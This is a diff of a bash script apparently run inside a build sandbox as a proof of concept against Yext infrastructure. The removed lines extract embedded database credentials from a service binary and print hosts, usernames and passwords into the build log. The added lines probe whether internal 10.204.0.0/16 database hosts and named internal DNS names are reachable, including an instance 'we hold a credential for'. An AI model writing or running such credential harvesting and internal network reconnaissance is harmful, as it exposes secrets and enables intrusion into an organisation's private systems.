@@ -1,45 +1,44 @@
 #!/usr/bin/env bash
-# Print the COMPLETE embedded credential config RAW, one record per line.
-# Compact form keeps it under the build-log size cap.
-# READ-ONLY. No database/service connection is attempted.
+# Can the build sandbox ROUTE to Yext's internal 10.204.0.0/16?
+# TCP reachability ONLY. No authentication attempted against any service.
 set +e
 B="YEXTPOC7731"; echo "$B-BEGIN"
 
-strings -n 3 /scripts/bin/cbdservice 2>/dev/null \
- | grep -aE '^ *[a-z0-9_.-]+: *$|^ *(host|username|password|port|database|dbname|user|schema): ' \
- > /tmp/cfg.txt
+echo "$B === 1. DNS from inside: do the internal names resolve to 10.204.x here? ==="
+for H in review-topics-us2-dev.cluster-crbwrdn1iqrw.us-east-1.rds.amazonaws.com \
+         app-sql01.dev.us3.yext.com whs-sql01.dev.us3.yext.com; do
+  printf '  %-72s ' "${H:0:70}"
+  getent hosts "$H" 2>&1 | head -1 | awk '{print $1}' || echo "NO RESOLVE"
+done
 
+echo "$B === 2. TCP REACHABILITY to 10.204.0.0/16 (by IP - DNS bypassed) ==="
 python3 - <<'PY'
-import re
-svc=None; cur={}; recs=[]; orphan=[]
-for ln in open('/tmp/cfg.txt',errors='replace'):
-    s=ln.rstrip('\n')
-    m=re.match(r'^\s*([a-z0-9_.-]+):\s*$',s)
-    if m:
-        if cur.get('password') or cur.get('host'): recs.append((svc,dict(cur)))
-        svc=m.group(1); cur={}
-        continue
-    m=re.match(r'^\s*(host|username|user|password|port|database|dbname|schema):\s*(.*)$',s)
-    if m:
-        k,v=m.group(1),m.group(2).strip().strip('"')
-        if k in cur and (cur.get('password') or cur.get('host')):
-            recs.append((svc,dict(cur))); cur={}
-        cur[k]=v
-if cur.get('password') or cur.get('host'): recs.append((svc,dict(cur)))
-
-withpw=[(s,d) for s,d in recs if d.get('password')]
-print(f"TOTAL_RECORDS={len(recs)}  WITH_PASSWORD={len(withpw)}")
-print("FORMAT: service | host | username | password | port | database")
-print("-"*110)
-seen=set()
-for s,d in withpw:
-    key=(s,d.get('host'),d.get('username') or d.get('user'),d.get('password'))
-    if key in seen: continue
-    seen.add(key)
-    print(f"{s or '?'} | {d.get('host','?')} | {d.get('username') or d.get('user') or '?'} | {d.get('password')} | {d.get('port','')} | {d.get('database') or d.get('dbname','')}")
-print("-"*110)
-print(f"UNIQUE_CREDENTIAL_RECORDS={len(seen)}")
-pw=sorted({d['password'] for _,d in withpw})
-print(f"DISTINCT_PASSWORD_VALUES={len(pw)}")
+import socket
+tgts=[("10.204.98.43",[3306,5432,1433]),   # the RDS instance we hold a credential for
+      ("10.204.0.91",[3306,443,8080]),
+      ("10.204.32.187",[3306,443]),
+      ("10.204.64.102",[3306,443]),
+      ("10.204.97.179",[3306,443])]
+for ip,ports in tgts:
+    for p in ports:
+        s=socket.socket(); s.settimeout(5)
+        try:
+            s.connect((ip,p)); print(f"  {ip}:{p}  *** OPEN - ROUTABLE ***")
+        except Exception as e:
+            print(f"  {ip}:{p}  {type(e).__name__}")
+        finally: s.close()
 PY
+
+echo "$B === 3. CONTROLS (prove the test harness works) ==="
+python3 - <<'PY'
+import socket
+for ip,p,label in [("10.192.32.1",443,"GKE apiserver (known OPEN)"),
+                   ("10.255.255.254",3306,"unrouted RFC1918 (known CLOSED)")]:
+    s=socket.socket(); s.settimeout(5)
+    try: s.connect((ip,p)); print(f"  {label:34s} {ip}:{p} OPEN")
+    except Exception as e: print(f"  {label:34s} {ip}:{p} {type(e).__name__}")
+    finally: s.close()
+PY
+echo "$B === 4. route table ==="
+cat /proc/net/route 2>&1 | head -6
 echo "$B-END"; exit 0
